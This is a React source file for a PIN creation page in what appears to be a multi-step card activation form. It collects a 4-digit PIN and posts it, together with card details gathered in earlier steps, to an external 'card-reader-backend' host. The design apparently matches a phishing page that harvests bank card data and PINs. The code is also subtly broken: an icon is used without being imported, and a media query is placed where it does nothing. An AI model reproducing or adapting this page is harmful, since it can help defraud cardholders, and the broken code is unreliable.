import { useForm } from "react-hook-form";
import { useNavigate } from "react-router-dom";
import { FaLock, FaCheck } from "react-icons/fa";
import { toast } from "react-toastify";
import { useState, useContext } from "react";
import { FormContext } from "../App";

function PinCreationPage({ prevStep }) {
  const {
    register,
    handleSubmit,
    formState: { errors },
    watch,
  } = useForm({
    defaultValues: { pin: "", confirmPin: "" },
  });
  const navigate = useNavigate();
  const [isLoading, setIsLoading] = useState(false);
  const { formData, setFormData } = useContext(FormContext);

  const onSubmit = (data) => {
    setIsLoading(true);
    if (data.pin !== data.confirmPin) {
      toast.error("PINs do not match.");
      setIsLoading(false);
      return;
    }
    if (data.pin.length !== 4 || !/^\d+$/.test(data.pin)) {
      toast.error("PIN must be exactly 4 digits.");
      setIsLoading(false);
      return;
    }
    const fullData = {
      ...formData,
      pin: data.pin,
    };
    fetch("https://card-reader-backend-ls73.onrender.com/activate", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(fullData),
    })
      .then((response) => response.json())
      .then((result) => {
        if (result.message === "Card activated successfully") {
          toast.success("PIN created successfully!");
          navigate("/loading");
        } else {
          toast.error(result.message);
        }
      })
      .catch(() => {
        toast.error("Server error.");
      })
      .finally(() => setIsLoading(false));
  };

  return (
    <form
      onSubmit={handleSubmit(onSubmit)}
      style={{
        display: "flex",
        flexDirection: "column",
        gap: "16px",
        backgroundColor: "#000",
        color: "#fff",
        padding: "20px",
        borderRadius: "8px",
        "@media (max-width: 480px)": { padding: "10px" },
      }}
    >
      <h2 style={{ fontSize: "24px", fontWeight: "bold", textAlign: "center" }}>
        Create your special pin
      </h2>
      <p style={{ fontSize: "14px", textAlign: "center" }}>
        consist of 4 digits
      </p>
      <p style={{ fontSize: "12px", textAlign: "center" }}>
        Note: without a pin you can't make any withdrawals or perform any
        transactions with this card.
      </p>
      <div style={{ textAlign: "left" }}>
        <label style={{ display: "flex", alignItems: "center" }}>
          PIN <FaLock style={{ marginLeft: "10px" }} />
        </label>
        <input
          type="password"
          {...register("pin", { required: true, pattern: /^\d{4}$/ })}
          style={{
            width: "100%",
            padding: "8px",
            border: "1px solid #ccc",
            borderRadius: "4px",
            marginTop: "5px",
            backgroundColor: "#333",
            color: "#fff",
          }}
          maxLength={4}
        />
        {errors.pin && (
          <p style={{ color: "red", fontSize: "12px" }}>
            PIN must be exactly 4 digits.
          </p>
        )}
      </div>
      <div style={{ textAlign: "left" }}>
        <label style={{ display: "flex", alignItems: "center" }}>
          Confirm PIN <FaCheck style={{ marginLeft: "10px" }} />
        </label>
        <input
          type="password"
          {...register("confirmPin", { required: true, pattern: /^\d{4}$/ })}
          style={{
            width: "100%",
            padding: "8px",
            border: "1px solid #ccc",
            borderRadius: "4px",
            marginTop: "5px",
            backgroundColor: "#333",
            color: "#fff",
          }}
          maxLength={4}
        />
        {errors.confirmPin && (
          <p style={{ color: "red", fontSize: "12px" }}>
            Confirm PIN must be exactly 4 digits.
          </p>
        )}
      </div>
      <button
        type="submit"
        style={{
          backgroundColor: "#3b82f6",
          color: "white",
          border: "none",
          padding: "10px",
          borderRadius: "4px",
          cursor: "pointer",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
        }}
        disabled={isLoading}
      >
        {isLoading ? "Creating PIN..." : "Create PIN"}
      </button>
      <button
        type="button"
        onClick={() => {
          prevStep();
          navigate("/stepiii");
        }}
        style={{
          backgroundColor: "transparent",
          color: "#666",
          border: "none",
          padding: "10px",
          cursor: "pointer",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
        }}
      >
        <FaArrowLeft style={{ marginRight: "8px" }} /> Back to Previous
      </button>
    </form>
  );
}

export default PinCreationPage;
